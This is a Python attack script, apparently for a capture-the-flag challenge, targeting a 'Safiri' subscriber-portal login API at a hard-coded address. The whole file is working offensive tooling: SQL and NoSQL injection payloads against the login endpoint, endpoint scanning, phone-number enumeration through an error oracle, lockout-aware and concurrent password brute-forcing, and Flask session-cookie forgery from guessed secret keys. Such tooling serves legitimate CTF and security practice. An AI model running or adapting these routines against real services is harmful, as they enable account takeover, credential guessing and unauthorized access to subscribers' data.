#!/usr/bin/env python3
import argparse
import concurrent.futures
import json
import os
import re
import time
import urllib.error
import urllib.request

from flask import Flask
from flask.sessions import SecureCookieSessionInterface

FLAG_RE = re.compile(r"GoH\{[^}\r\n]+\}")


def extract_flag(text):
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else ""


def http_req(base, path, method="GET", payload=None, headers=None, timeout=15):
    url = base.rstrip("/") + path
    hdrs = dict(headers or {})
    data = None
    if payload is not None:
        data = json.dumps(payload).encode()
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read().decode(errors="replace")
            return r.status, body, dict(r.headers.items())
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        return e.code, body, dict(e.headers.items())
    except Exception as e:
        return -1, repr(e), {}


def cmd_matrix(args):
    payloads = [
        ("wrong_basic", {"msisdn": "+256700000000", "password": "wrong"}),
        ("valid_oracle_bool", {"msisdn": "+256700000000", "password": True}),
        ("invalid_oracle_bool", {"msisdn": "+256700000001", "password": True}),
        ("msisdn_whitespace", {"msisdn": " +256700000000 ", "password": "wrong"}),
        ("password_int", {"msisdn": "+256700000000", "password": 12345}),
        ("password_null", {"msisdn": "+256700000000", "password": None}),
        ("password_obj", {"msisdn": "+256700000000", "password": {"$ne": ""}}),
        ("password_arr", {"msisdn": "+256700000000", "password": ["x"]}),
        ("sqli_pass_1", {"msisdn": "+256700000000", "password": "' OR '1'='1"}),
        ("sqli_pass_2", {"msisdn": "+256700000000", "password": "' OR 1=1 -- -"}),
        ("sqli_msisdn_1", {"msisdn": "'+256700000000' OR '1'='1", "password": "x"}),
        ("sqli_msisdn_2", {"msisdn": "+256700000000' -- -", "password": "x"}),
        ("empty_both", {"msisdn": "", "password": ""}),
    ]
    for name, payload in payloads:
        status, body, _ = http_req(args.base, "/api/v1/auth/login", "POST", payload)
        one = body.strip().replace("\n", " ")
        print(f"[{name}] {status} {one}")


def candidate_paths():
    p = [
        "/",
        "/health",
        "/dashboard",
        "/robots.txt",
        "/sitemap.xml",
        "/api/v1/session",
        "/api/v1/auth/login",
        "/api/v1/auth/logout",
    ]
    words = [
        "flag",
        "flags",
        "admin",
        "debug",
        "status",
        "health",
        "session",
        "auth",
        "login",
        "logout",
        "user",
        "users",
        "account",
        "profile",
        "me",
        "dashboard",
        "balance",
        "usage",
        "billing",
        "support",
        "internal",
        "config",
        "system",
        "diagnostics",
        "report",
        "reports",
        "export",
        "download",
        "read",
        "logs",
        "metrics",
        "secret",
        "secrets",
        "token",
        "tokens",
    ]
    for w in words:
        p.append("/api/v1/" + w)
        p.append("/api/v1/auth/" + w)
    seen = set()
    out = []
    for x in p:
        if x in seen:
            continue
        seen.add(x)
        out.append(x)
    return out


def cmd_scan(args):
    methods = ["GET", "OPTIONS", "POST"]
    for path in candidate_paths():
        for method in methods:
            payload = {} if method == "POST" else None
            status, body, headers = http_req(args.base, path, method, payload)
            if status in (404,):
                continue
            if method == "POST" and status == 405:
                continue
            one = body.strip().replace("\n", " ")
            if len(one) > 160:
                one = one[:160] + "..."
            allow = headers.get("Allow", "")
            extra = f" allow={allow}" if allow else ""
            print(f"{method:7} {status:3} {path}{extra} body={one}")
            flag = extract_flag(body)
            if flag:
                print(f"[FLAG] {flag}")
                return 0
    return 0


def normalize_msisdn(msisdn):
    s = str(msisdn).strip()
    if not s.startswith("+"):
        s = "+" + s
    return s


def cmd_enum(args):
    hits = []
    for n in range(args.start, args.end + 1):
        msisdn = normalize_msisdn(n)
        status, body, _ = http_req(
            args.base,
            "/api/v1/auth/login",
            "POST",
            {"msisdn": msisdn, "password": True},
            timeout=args.timeout,
        )
        body_one = body.strip().replace("\n", " ")
        print(f"{msisdn} => {status} {body_one}")
        if status == 500:
            hits.append(msisdn)
    if hits:
        print("[oracle_hits]")
        for h in hits:
            print(h)


def load_words(path):
    out = []
    seen = set()
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            w = line.strip()
            if not w or w in seen:
                continue
            seen.add(w)
            out.append(w)
    return out


def load_state(path):
    if not os.path.exists(path):
        return 0
    with open(path, "r", encoding="utf-8") as f:
        return int(json.load(f).get("index", 0))


def save_state(path, idx):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"index": idx}, f)
    os.replace(tmp, path)


def cmd_session(args):
    hdrs = {}
    if args.cookie:
        hdrs["Cookie"] = args.cookie
    status, body, _ = http_req(args.base, "/api/v1/session", "GET", headers=hdrs)
    print(f"status={status}")
    print(body)
    flag = extract_flag(body)
    if flag:
        print(f"[FLAG] {flag}")


def make_flask_session_cookie(secret_key, data):
    app = Flask(__name__)
    app.secret_key = secret_key
    signer = SecureCookieSessionInterface().get_signing_serializer(app)
    if signer is None:
        return ""
    return signer.dumps(data)


def load_lines(path):
    out = []
    seen = set()
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            v = line.strip()
            if not v or v in seen:
                continue
            seen.add(v)
            out.append(v)
    return out


def default_secret_candidates():
    return [
        "secret",
        "secret-key",
        "change-me",
        "changeme",
        "development",
        "dev",
        "flask",
        "flask-secret",
        "safiri",
        "safiri-connect",
        "safiri_connect",
        "uganda",
        "kampala",
        "telecom",
        "mvno",
        "subscriber",
        "portal",
        "password",
        "admin",
        "flag",
        "GoH",
        "goh",
        "itwasflagtome",
        "it_was_flag_to_me",
        "but_for_my_own_part_it_was_flag_to_me",
        "But, for my own part, it was flag to me",
    ]


def default_session_payloads():
    return [
        {"authenticated": True},
        {"logged_in": True},
        {"is_admin": True},
        {"admin": True},
        {"user": "+256700000000"},
        {"username": "+256700000000"},
        {"msisdn": "+256700000000"},
        {"user_id": 1},
        {"uid": 1},
        {"authenticated": True, "msisdn": "+256700000000"},
        {"logged_in": True, "user": "+256700000000"},
        {"is_admin": True, "user": "admin"},
    ]


def cmd_cookie(args):
    secrets = default_secret_candidates()
    if args.secret_file:
        secrets = load_lines(args.secret_file)
    payloads = default_session_payloads()

    for secret in secrets:
        for payload in payloads:
            try:
                cookie_val = make_flask_session_cookie(secret, payload)
            except Exception:
                continue
            hdr = {"Cookie": f"session={cookie_val}"}
            s1, b1, _ = http_req(args.base, "/api/v1/session", "GET", headers=hdr, timeout=args.timeout)
            f1 = extract_flag(b1)
            if f1:
                print(f"[FLAG] {f1} via /api/v1/session secret={secret} payload={payload}")
                return 0
            s2, b2, _ = http_req(args.base, "/dashboard", "GET", headers=hdr, timeout=args.timeout)
            f2 = extract_flag(b2)
            if f2:
                print(f"[FLAG] {f2} via /dashboard secret={secret} payload={payload}")
                return 0
            if s1 == -1 or s2 == -1:
                print(f"[skip-timeout] secret={secret} payload={payload} session={s1} dashboard={s2}")
                continue
            if s1 != 401:
                print(f"[HIT?] /api/v1/session status={s1} secret={secret} payload={payload} body={b1[:160]}")
                return 0
            if "Subscriber Portal" not in b2:
                print(f"[HIT?] /dashboard status={s2} secret={secret} payload={payload} body={b2[:160]}")
                return 0
            print(f"secret={secret} payload={payload} => session:{s1} dashboard:{s2}")
    print("[-] No session forgery hit in tested candidates")
    return 0


def cmd_bruteforce(args):
    msisdn = normalize_msisdn(args.msisdn)
    words = load_words(args.wordlist)
    idx = load_state(args.state)
    print(f"[*] loaded={len(words)} resume_index={idx} msisdn={msisdn}")
    attempts_window = 0
    attempts_run = 0

    while idx < len(words):
        if args.max_attempts and attempts_run >= args.max_attempts:
            print("[*] max-attempts reached")
            save_state(args.state, idx)
            return 0

        if attempts_window >= args.window:
            print(f"[*] cooldown {args.cooldown}s")
            time.sleep(args.cooldown)
            attempts_window = 0

        pw = words[idx]
        status, body, headers = http_req(
            args.base,
            "/api/v1/auth/login",
            "POST",
            {"msisdn": msisdn, "password": pw},
            timeout=args.timeout,
        )
        b1 = body.strip().replace("\n", " ")
        print(f"[{idx + 1}/{len(words)}] {pw} => {status} {b1}")
        flag = extract_flag(body)
        if flag:
            print(f"[FLAG] {flag}")
            save_state(args.state, idx)
            return 0

        if status == 200 and "success" in body.lower():
            print("[+] LOGIN HIT")
            cookie = headers.get("Set-Cookie", "")
            print(f"set-cookie={cookie}")
            if cookie:
                c = cookie.split(";", 1)[0]
                s2, b2, _ = http_req(args.base, "/api/v1/session", "GET", headers={"Cookie": c})
                print(f"session_status={s2} session_body={b2}")
                flag2 = extract_flag(b2)
                if flag2:
                    print(f"[FLAG] {flag2}")
            save_state(args.state, idx)
            return 0

        if status == 429:
            print(f"[*] locked, wait {args.cooldown}s and retry same password")
            time.sleep(args.cooldown)
            status2, body2, _ = http_req(
                args.base,
                "/api/v1/auth/login",
                "POST",
                {"msisdn": msisdn, "password": pw},
                timeout=args.timeout,
            )
            b2 = body2.strip().replace("\n", " ")
            print(f"[retry] {pw} => {status2} {b2}")
            if status2 == 200 and "success" in body2.lower():
                print("[+] LOGIN HIT (retry)")
                save_state(args.state, idx)
                return 0
            attempts_window = 1 if status2 in (401, 500) else 0
            idx += 1
            attempts_run += 1
            save_state(args.state, idx)
            continue

        attempts_window += 1
        idx += 1
        attempts_run += 1
        save_state(args.state, idx)

    print("[-] completed wordlist without hit")
    return 0


def cmd_burst(args):
    msisdn = normalize_msisdn(args.msisdn)
    words = load_words(args.wordlist)
    idx = load_state(args.state)
    print(f"[*] burst mode loaded={len(words)} resume_index={idx} msisdn={msisdn}")
    batches = 0

    while idx < len(words):
        if args.max_batches and batches >= args.max_batches:
            print("[*] reached max-batches")
            save_state(args.state, idx)
            return 0

        batch = words[idx : idx + args.batch_size]
        if not batch:
            break
        print(f"[*] batch {batches + 1} size={len(batch)} start_index={idx + 1}")

        def attempt(pw):
            status, body, headers = http_req(
                args.base,
                "/api/v1/auth/login",
                "POST",
                {"msisdn": msisdn, "password": pw},
                timeout=args.timeout,
            )
            return pw, status, body, headers

        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(batch)) as ex:
            futs = [ex.submit(attempt, pw) for pw in batch]
            for fut in concurrent.futures.as_completed(futs):
                results.append(fut.result())

        code_count = {}
        for pw, status, body, headers in results:
            code_count[status] = code_count.get(status, 0) + 1
            b1 = body.strip().replace("\n", " ")
            print(f"{pw} => {status} {b1}")
            flag = extract_flag(body)
            if flag:
                print(f"[FLAG] {flag}")
                save_state(args.state, idx)
                return 0
            if status == 200 and "success" in body.lower():
                print(f"[+] LOGIN HIT password={pw}")
                cookie = headers.get("Set-Cookie", "")
                print(f"set-cookie={cookie}")
                if cookie:
                    c = cookie.split(";", 1)[0]
                    s2, b2, _ = http_req(args.base, "/api/v1/session", "GET", headers={"Cookie": c})
                    print(f"session_status={s2} session_body={b2}")
                    f2 = extract_flag(b2)
                    if f2:
                        print(f"[FLAG] {f2}")
                save_state(args.state, idx)
                return 0

        print(f"[*] code summary {code_count}")
        idx += len(batch)
        batches += 1
        save_state(args.state, idx)
        if idx >= len(words):
            break
        if args.cooldown > 0:
            print(f"[*] cooldown {args.cooldown}s")
            time.sleep(args.cooldown)

    print("[-] burst run completed without hit")
    return 0


def build_parser():
    ap = argparse.ArgumentParser(description="Safiri 33140 helper")
    ap.add_argument("--base", default="http://209.38.92.205:33140", help="Base URL")
    sp = ap.add_subparsers(dest="cmd", required=True)

    sp.add_parser("matrix", help="Run login payload matrix")
    sp.add_parser("scan", help="Scan candidate endpoints")

    ap_enum = sp.add_parser("enum", help="Enumerate msisdn oracle using password=true")
    ap_enum.add_argument("--start", type=int, default=256700000000)
    ap_enum.add_argument("--end", type=int, default=256700000150)
    ap_enum.add_argument("--timeout", type=int, default=12)

    ap_bf = sp.add_parser("bruteforce", help="Lock-aware password brute")
    ap_bf.add_argument("--msisdn", required=True)
    ap_bf.add_argument("--wordlist", required=True)
    ap_bf.add_argument("--state", default="/home/mfekenyuzi/pwned-ctf/h4k-it/raypen/bruteforce_state_33140.json")
    ap_bf.add_argument("--window", type=int, default=5)
    ap_bf.add_argument("--cooldown", type=int, default=65)
    ap_bf.add_argument("--max-attempts", type=int, default=0)
    ap_bf.add_argument("--timeout", type=int, default=12)

    ap_session = sp.add_parser("session", help="Check /api/v1/session")
    ap_session.add_argument("--cookie", default="", help="Cookie header value (e.g. session=...)")

    ap_burst = sp.add_parser("burst", help="Concurrent password burst attempts")
    ap_burst.add_argument("--msisdn", required=True)
    ap_burst.add_argument("--wordlist", required=True)
    ap_burst.add_argument("--state", default="/home/mfekenyuzi/pwned-ctf/h4k-it/raypen/burst_state_33140.json")
    ap_burst.add_argument("--batch-size", type=int, default=20)
    ap_burst.add_argument("--cooldown", type=int, default=65)
    ap_burst.add_argument("--max-batches", type=int, default=0)
    ap_burst.add_argument("--timeout", type=int, default=12)

    ap_cookie = sp.add_parser("cookie", help="Try Flask session cookie forgery candidates")
    ap_cookie.add_argument("--secret-file", default="", help="File with candidate Flask secret keys")
    ap_cookie.add_argument("--timeout", type=int, default=10)

    return ap


def main():
    ap = build_parser()
    args = ap.parse_args()
    if args.cmd == "matrix":
        return cmd_matrix(args)
    if args.cmd == "scan":
        return cmd_scan(args)
    if args.cmd == "enum":
        return cmd_enum(args)
    if args.cmd == "bruteforce":
        return cmd_bruteforce(args)
    if args.cmd == "session":
        return cmd_session(args)
    if args.cmd == "burst":
        return cmd_burst(args)
    if args.cmd == "cookie":
        return cmd_cookie(args)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
